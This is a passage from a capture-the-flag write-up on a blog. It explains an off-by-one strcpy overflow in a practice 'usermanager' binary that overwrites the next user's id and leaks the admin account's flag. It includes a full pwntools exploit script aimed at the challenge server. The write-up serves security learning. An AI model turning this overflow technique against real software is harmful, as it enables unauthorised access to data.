<p>At first, function looks safe, but if we take a look at docs of <code>strlen</code> and <code>strcpy</code> we see:</p>
<div class="highlight"><pre><span></span><code><span class="n">The</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="n">library</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">size_t</span><span class="w"> </span><span class="o">**</span><span class="n">strlen</span><span class="o">**</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="nb">str</span><span class="p">)</span><span class="w"> </span><span class="n">computes</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="nb">str</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="n">to</span><span class="p">,</span><span class="w"> </span><span class="o">**</span><span class="n">but</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">including</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">terminating</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="w"> </span><span class="n">character</span><span class="o">.**</span>

<span class="n">The</span><span class="w"> </span><span class="o">**</span><span class="n">strcpy</span><span class="o">**</span><span class="p">()</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">copies</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="n">pointed</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="p">(</span><span class="o">**</span><span class="n">including</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="w"> </span><span class="n">character</span><span class="o">**</span><span class="p">)</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">character</span><span class="w"> </span><span class="n">array</span><span class="w"> </span><span class="n">destination</span><span class="o">.</span>
</code></pre></div>

<p>And since functions only checks for <code>len &gt; maxage</code> if we insert <code>8 * a</code> (8 is the size of buffer holding age) check will still pass. This will cause <code>strcpy</code> to copy 9 bytes to destination buffer overwriting one byte of data. If we take a look at user struct we will see that it will overwrite <code>id</code> of next user since they are stored in array.</p>
<p>Looking at how <code>viewUser()</code> and <code>displayUserInfo()</code> work. We see that <code>viewUser()</code> sets <code>current_user</code> to id of first user with the given name, while <code>displayUserInfo()</code> uses that <code>current_user</code> as index to user array. This means that if we create a user, overwrite his <code>id</code> to 0, then select him program will actually print information of systemAccount giving us flag. So let’s write short script implementing this (although in this case, it is easy to do manually as well):</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
<span class="c1">#r = process(&#39;./usermanager&#39;)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwnable.hackable.ca&#39;</span><span class="p">,</span> <span class="mi">9995</span><span class="p">)</span>

<span class="c1">#create 2 users a1 and a2</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;set usernme&gt; &#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;set email&gt; &#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;set age&gt; &#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;set password&gt; &#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
<span class="c1">#change age of user a1</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;name of user&gt; &#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;set age&gt; &#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="c1">#get our flag</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;name of user&gt; &#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a2&#39;</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div>

<p>And we get the flag :D</p>
<p><img alt="flag" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_8_3_UserManager.png"></p>
                </div>
                <footer class="text-right">
                    <p>- F3real</p>
                </footer>
    <div id="show-comments" class="span7 text-center">
        <a href="https://f3real.github.io/hackable_ca_userManager.html#disqus_thread"
          data-disqus-identifier="hackable_ca_userManager"
        class="btn btn-primary twitchy-background">Show Comments</a>
    </div>
    <section id="comments" class="comments hidden">
        <hr/>
        <h2>Comments</h2>
        <div id="disqus_thread"></div>
        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
            Disqus.</a></noscript>
        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </section>
            </div>
        </div>
    </article>
</section>
<footer>
    <hr>
    <div class="row">
        <div class="col-lg-10 text-center">
            <p><small>
                Built by <a href="http://docs.getpelican.com/en/latest">Pelican</a> / <a href="https://github.com/F3real/pelican-twitchy">pelican-twitchy</a>
                &middot;                    &copy; 2024 F3real
            </small></p>
        </div>
    </div>
</footer>            </div>
        </div>
        <!-- /#page-content-wrapper -->
    </div>
    <!-- /#wrapper -->

<!-- disqus -->
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'https-f3real-github-io'; // required: replace example with your forum shortname

            var disqus_identifier = 'hackable_ca_userManager';
        var disqus_url = 'https://f3real.github.io/hackable_ca_userManager.html';

    var disqus_config = function () {
        this.language = "en";
    };

        var commentsDiv = document.getElementById('show-comments');
        commentsDiv.onclick = function() {
            /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
            this.style.display = 'none';        
        };
</script>
<!-- /disqus -->
    <script>
        const wrapper = document.getElementById('wrapper');
        const sidebarBig = document.getElementById('sidebar-wrapper');
        const sidebarSmall = document.getElementById('sidebar-wrapper-small');

        const triggers = Array.from(document.querySelectorAll('[data-toggle="collapse"]'));
        for (var i = 0; i < triggers.length; i++) { 
            triggers[i].addEventListener('click', (ev) => {
                const elm = ev.currentTarget;    
                ev.preventDefault();
                const selector = elm.getAttribute('href').replace('#','');
                elm.classList.toggle('collapsed');
                document.getElementById(selector).classList.toggle('show');
            }, false);
        } 

        function showBigNav() {;
            sidebarBig.style.display = 'block';
            sidebarSmall.style.display = 'none';
        }
        function showSmallNav() {
            sidebarBig.style.display = 'none';
            sidebarSmall.style.display = 'block';
        }

        const mediaQuery = window.matchMedia('(min-width:768px)');
        mediaQuery.onchange = e => {
            if (wrapper.classList.contains('toggled')) {
                    wrapper.classList.remove('toggled');
            } else {
                if (e.matches) {
                    showBigNav();
                } else {
                    showSmallNav();
                }
            }
        }

        function setNavbar() {
            var condition = wrapper.classList.contains('toggled');
            if (!mediaQuery.matches) {
                condition = !condition;
            }
            if (condition) {
                showSmallNav();
            } else {
                showBigNav();
            }
        }

        function toggleMenu(){
            wrapper.classList.toggle('toggled');
            setNavbar();
        }

        window.onload = setNavbar;
    </script>
	<script data-goatcounter="https://f3real.goatcounter.com/count"
        async src="//gc.zgo.at/count.js"></script>
</body>
</html>